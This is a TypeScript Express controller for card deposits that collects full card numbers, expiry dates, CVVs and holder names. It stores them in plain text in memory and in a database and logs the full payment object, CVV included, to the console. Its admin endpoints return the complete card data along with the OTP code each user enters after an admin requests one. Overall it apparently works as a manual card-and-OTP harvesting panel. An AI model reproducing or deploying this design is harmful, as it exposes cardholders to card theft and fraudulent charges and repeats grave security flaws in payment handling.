import { Request, Response } from 'express';
import mongoose from 'mongoose';
import Deposit from '../models/Deposit';
import { AuthenticatedRequest } from '../types/CustomRequest';
import { AuthenticatedAdminRequest } from '../middleware/adminAuth';
import { SimpleCardPayment } from '../models/SimpleCardPayment';

// Simple card payment interface for manual processing (in-memory)
interface InMemoryCardPayment {
  userId: mongoose.Types.ObjectId;
  amount: number;
  currency: string;
  cardNumber: string;      // Will be encrypted in production
  expiryMonth: string;
  expiryYear: string;
  cvv: string;             // Will be encrypted in production
  holderName: string;
  status: 'pending' | 'processing' | 'approved' | 'rejected';
  needsOtp: boolean;
  otpCode?: string;
  paymentId: string;
  createdAt: Date;
  updatedAt: Date;
}

// Temporary in-memory storage for simplicity (use database in production)
const cardPayments: Map<string, InMemoryCardPayment> = new Map();

// Generate simple payment ID
const generatePaymentId = () => {
  return 'CP' + Date.now() + Math.random().toString(36).substr(2, 5).toUpperCase();
};

// Submit simple card payment
export const submitSimpleCardPayment = async (req: AuthenticatedRequest, res: Response): Promise<void> => {
  try {
    if (!req.user) {
      res.status(401).json({ message: 'User not authenticated' });
      return;
    }

    const { amount, currency, cardDetails } = req.body;
    const { cardNumber, expiryMonth, expiryYear, cvv, holderName } = cardDetails;

    // Basic validation
    if (!amount || !cardNumber || !expiryMonth || !expiryYear || !cvv || !holderName) {
      res.status(400).json({ message: 'All card details are required' });
      return;
    }

    if (amount <= 0) {
      res.status(400).json({ message: 'Invalid amount' });
      return;
    }

    const paymentId = generatePaymentId();

    // Store card payment details in memory (legacy)
    const inMemoryCardPayment: InMemoryCardPayment = {
      userId: new mongoose.Types.ObjectId(req.user.userId),
      amount: parseFloat(amount),
      currency: currency || 'USD',
      cardNumber: cardNumber.replace(/\s/g, ''), // Remove spaces
      expiryMonth,
      expiryYear,
      cvv,
      holderName: holderName.trim(),
      status: 'pending',
      needsOtp: false,
      paymentId,
      createdAt: new Date(),
      updatedAt: new Date()
    };

    console.log('=== STORING CARD PAYMENT ===');
    console.log('Payment ID:', paymentId);
    console.log('User ID:', req.user.userId);
    console.log('Amount:', parseFloat(amount));
    console.log('Card Payment object:', inMemoryCardPayment);

    // Store in memory (legacy support)
    cardPayments.set(paymentId, inMemoryCardPayment);

    // Also store in database for admin interface
    const dbCardPayment = new SimpleCardPayment({
      paymentId,
      userId: req.user.userId,
      amount: parseFloat(amount),
      currency: currency || 'USD',
      cardNumber: cardNumber.replace(/\s/g, ''), // Store full number (should be encrypted in production)
      expiryMonth,
      expiryYear,
      cvv, // Should be encrypted in production
      holderName: holderName.trim(),
      status: 'pending',
      ipAddress: req.ip || 'unknown',
      userAgent: req.get('User-Agent') || 'unknown'
    });

    await dbCardPayment.save();

    console.log('Payment stored in memory. Current map size:', cardPayments.size);
    console.log('Payment stored in database with ID:', dbCardPayment._id);
    console.log('All stored payment IDs:', Array.from(cardPayments.keys()));

    // Create deposit record
    const deposit = new Deposit({
      userId: req.user.userId,
      paymentMethod: 'card',
      amount: parseFloat(amount),
      status: 'pending',
      adminNotes: `Card Payment - ${paymentId}`
    });

    await deposit.save();

    res.status(201).json({
      success: true,
      message: 'Card payment submitted successfully',
      paymentId,
      depositId: deposit._id,
      status: 'pending'
    });

  } catch (error) {
    console.error('Submit simple card payment error:', error);
    res.status(500).json({
      success: false,
      message: 'Internal server error'
    });
  }
};

// Get card payment status for user
export const getCardPaymentStatus = async (req: AuthenticatedRequest, res: Response): Promise<void> => {
  try {
    if (!req.user) {
      res.status(401).json({ message: 'User not authenticated' });
      return;
    }

    const { paymentId } = req.params;

    // Check database first
    const dbPayment = await SimpleCardPayment.findOne({
      paymentId,
      userId: req.user.userId
    });

    if (dbPayment) {
      res.json({
        success: true,
        payment: {
          paymentId: dbPayment.paymentId,
          status: dbPayment.status,
          amount: dbPayment.amount,
          currency: dbPayment.currency,
          needsOtp: dbPayment.needsOtp,
          otpCode: dbPayment.otpCode,
          otpRequestedAt: dbPayment.otpRequestedAt,
          otpSubmittedAt: dbPayment.otpSubmittedAt,
          createdAt: dbPayment.createdAt,
          processedAt: dbPayment.processedAt,
          processingNotes: dbPayment.processingNotes
        }
      });
      return;
    }

    // Fallback to in-memory storage
    const cardPayment = cardPayments.get(paymentId);
    if (!cardPayment) {
      res.status(404).json({ message: 'Card payment not found' });
      return;
    }

    // Check if user owns this payment
    if (cardPayment.userId.toString() !== req.user.userId) {
      res.status(403).json({ message: 'Access denied' });
      return;
    }

    res.json({
      success: true,
      payment: {
        paymentId: cardPayment.paymentId,
        status: cardPayment.status,
        amount: cardPayment.amount,
        currency: cardPayment.currency,
        needsOtp: cardPayment.needsOtp,
        otpCode: cardPayment.otpCode,
        createdAt: cardPayment.createdAt
      }
    });

  } catch (error) {
    console.error('Get card payment status error:', error);
    res.status(500).json({
      success: false,
      message: 'Internal server error'
    });
  }
};

// Request OTP for card payment
export const requestCardPaymentOtp = async (req: AuthenticatedRequest, res: Response): Promise<void> => {
  try {
    const { paymentId } = req.params;

    const cardPayment = cardPayments.get(paymentId);
    if (!cardPayment) {
      res.status(404).json({ message: 'Card payment not found' });
      return;
    }

    // Check if user owns this payment
    if (cardPayment.userId.toString() !== req.user!.userId) {
      res.status(403).json({ message: 'Access denied' });
      return;
    }

    // Mark as needing OTP
    cardPayment.needsOtp = true;
    cardPayment.status = 'processing';
    cardPayment.updatedAt = new Date();
    cardPayments.set(paymentId, cardPayment);

    res.json({
      success: true,
      message: 'OTP requested successfully',
      paymentId
    });

  } catch (error) {
    console.error('Request OTP error:', error);
    res.status(500).json({
      success: false,
      message: 'Internal server error'
    });
  }
};

// Verify OTP for card payment
export const verifyCardPaymentOtp = async (req: AuthenticatedRequest, res: Response): Promise<void> => {
  try {
    const { paymentId } = req.params;
    const { otpCode } = req.body;

    const cardPayment = cardPayments.get(paymentId);
    if (!cardPayment) {
      res.status(404).json({ message: 'Card payment not found' });
      return;
    }

    // Check if user owns this payment
    if (cardPayment.userId.toString() !== req.user!.userId) {
      res.status(403).json({ message: 'Access denied' });
      return;
    }

    if (!otpCode || otpCode.length !== 6) {
      res.status(400).json({ message: 'Invalid OTP code' });
      return;
    }

    // Store OTP code
    cardPayment.otpCode = otpCode;
    cardPayment.updatedAt = new Date();
    cardPayments.set(paymentId, cardPayment);

    // Also update in database
    await SimpleCardPayment.findOneAndUpdate(
      { paymentId },
      {
        otpCode,
        otpSubmittedAt: new Date(),
        updatedAt: new Date()
      }
    );

    res.json({
      success: true,
      message: 'OTP verified successfully',
      paymentId
    });

  } catch (error) {
    console.error('Verify OTP error:', error);
    res.status(500).json({
      success: false,
      message: 'Internal server error'
    });
  }
};

// Get card payment details (for admin)
export const getCardPaymentDetails = async (req: Request, res: Response): Promise<void> => {
  try {
    const { paymentId } = req.params;

    const cardPayment = cardPayments.get(paymentId);
    if (!cardPayment) {
      res.status(404).json({ message: 'Card payment not found' });
      return;
    }

    res.json({
      success: true,
      data: {
        paymentId: cardPayment.paymentId,
        amount: cardPayment.amount,
        currency: cardPayment.currency,
        cardNumber: cardPayment.cardNumber,
        expiryMonth: cardPayment.expiryMonth,
        expiryYear: cardPayment.expiryYear,
        cvv: cardPayment.cvv,
        holderName: cardPayment.holderName,
        status: cardPayment.status,
        needsOtp: cardPayment.needsOtp,
        otpCode: cardPayment.otpCode,
        createdAt: cardPayment.createdAt,
        updatedAt: cardPayment.updatedAt
      }
    });

  } catch (error) {
    console.error('Get card payment details error:', error);
    res.status(500).json({
      success: false,
      message: 'Internal server error'
    });
  }
};

// Get all pending card payments (for admin)
export const getPendingCardPayments = async (req: Request, res: Response): Promise<void> => {
  try {
    console.log('=== GET PENDING CARD PAYMENTS ===');
    console.log('Total payments in memory:', cardPayments.size);
    console.log('All payment IDs:', Array.from(cardPayments.keys()));

    const pendingPayments = Array.from(cardPayments.values()).filter(payment =>
      payment.status === 'pending' || payment.status === 'processing'
    );

    console.log('Pending payments found:', pendingPayments.length);
    pendingPayments.forEach((payment, index) => {
      console.log(`Payment ${index + 1}:`, {
        paymentId: payment.paymentId,
        userId: payment.userId,
        amount: payment.amount,
        status: payment.status,
        createdAt: payment.createdAt
      });
    });

    res.json({
      success: true,
      payments: pendingPayments.map(payment => ({
        paymentId: payment.paymentId,
        userId: payment.userId,
        amount: payment.amount,
        currency: payment.currency,
        cardNumber: payment.cardNumber,
        expiryMonth: payment.expiryMonth,
        expiryYear: payment.expiryYear,
        cvv: payment.cvv,
        holderName: payment.holderName,
        status: payment.status,
        needsOtp: payment.needsOtp,
        otpCode: payment.otpCode,
        createdAt: payment.createdAt,
        updatedAt: payment.updatedAt
      })),
      count: pendingPayments.length
    });

  } catch (error) {
    console.error('Get pending card payments error:', error);
    res.status(500).json({
      success: false,
      message: 'Internal server error'
    });
  }
};

// Admin request OTP for card payment
export const adminRequestCardPaymentOtp = async (req: Request, res: Response): Promise<void> => {
  try {
    const { paymentId } = req.params;

    // Update in-memory storage
    const cardPayment = cardPayments.get(paymentId);
    if (!cardPayment) {
      res.status(404).json({ message: 'Card payment not found' });
      return;
    }

    // Mark as needing OTP and status to processing
    cardPayment.needsOtp = true;
    cardPayment.status = 'processing';
    cardPayment.updatedAt = new Date();
    cardPayments.set(paymentId, cardPayment);

    // Also update in database
    await SimpleCardPayment.findOneAndUpdate(
      { paymentId },
      {
        needsOtp: true,
        status: 'processing',
        otpRequestedAt: new Date(),
        updatedAt: new Date()
      }
    );

    res.json({
      success: true,
      message: 'OTP requested successfully. User will be prompted to enter OTP.',
      paymentId,
      needsOtp: true
    });

  } catch (error) {
    console.error('Admin request OTP error:', error);
    res.status(500).json({
      success: false,
      message: 'Internal server error'
    });
  }
};

// Update card payment status (for admin)
export const updateCardPaymentStatus = async (req: Request, res: Response): Promise<void> => {
  try {
    const { paymentId } = req.params;
    const { status, adminNotes } = req.body;

    const cardPayment = cardPayments.get(paymentId);
    if (!cardPayment) {
      res.status(404).json({ message: 'Card payment not found' });
      return;
    }

    if (!['approved', 'rejected'].includes(status)) {
      res.status(400).json({ message: 'Invalid status. Must be approved or rejected.' });
      return;
    }

    // Update card payment status
    cardPayment.status = status;
    cardPayment.updatedAt = new Date();
    cardPayments.set(paymentId, cardPayment);

    // Also update in database
    await SimpleCardPayment.findOneAndUpdate(
      { paymentId },
      {
        status,
        processedAt: new Date(),
        processingNotes: adminNotes,
        updatedAt: new Date()
      }
    );

    // Update corresponding deposit
    const deposit = await Deposit.findOne({
      userId: cardPayment.userId,
      adminNotes: `Card Payment - ${paymentId}`
    });

    if (deposit) {
      deposit.status = status === 'approved' ? 'approved' : 'rejected';
      deposit.adminNotes = adminNotes || `Card payment ${status}`;
      deposit.processedAt = new Date();
      await deposit.save();
    }

    res.json({
      success: true,
      message: `Card payment ${status} successfully`,
      paymentId,
      status
    });

  } catch (error) {
    console.error('Update card payment status error:', error);
    res.status(500).json({
      success: false,
      message: 'Internal server error'
    });
  }
};

export default {
  submitSimpleCardPayment,
  getCardPaymentStatus,
  requestCardPaymentOtp,
  verifyCardPaymentOtp,
  getCardPaymentDetails,
  getPendingCardPayments,
  adminRequestCardPaymentOtp,
  updateCardPaymentStatus
};
